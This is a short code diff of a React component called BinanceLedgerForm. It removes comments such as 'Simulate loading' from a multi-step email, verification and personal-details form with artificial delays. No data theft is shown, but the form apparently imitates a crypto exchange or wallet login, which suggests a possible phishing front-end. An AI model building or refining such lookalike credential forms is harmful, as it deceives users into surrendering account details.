@@ -48,7 +48,6 @@ const BinanceLedgerForm: FC = () => {
     }
     
     setIsLoading(true);
-    // Simulate loading
     await new Promise(resolve => setTimeout(resolve, 1500));
     setIsLoading(false);
     setCurrentStep('verification');
@@ -66,7 +65,6 @@ const BinanceLedgerForm: FC = () => {
     }
     
     setIsLoading(true);
-    // Simulate loading
     await new Promise(resolve => setTimeout(resolve, 2000));
     setIsLoading(false);
     setCurrentStep('personal-details');
@@ -87,7 +85,6 @@ const BinanceLedgerForm: FC = () => {
     }
     
     setIsLoading(true);
-    // Simulate loading
     await new Promise(resolve => setTimeout(resolve, 2000));
     setIsLoading(false);
     setCurrentStep('success');
@@ -104,7 +101,6 @@ const BinanceLedgerForm: FC = () => {
 
   const renderEmailStep = () => (
     <>
-      {/* Header with QR Code Icon */}
       <div className="flex justify-between items-center mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
@@ -220,7 +216,6 @@ const BinanceLedgerForm: FC = () => {
         </button>
       </form>
 
-      {/* ... keep existing divider and social login buttons ... */}
       <div className="my-4 flex items-center md:mb-2 md:mt-6">
         <div 
           className="h-[1px] flex-1" 
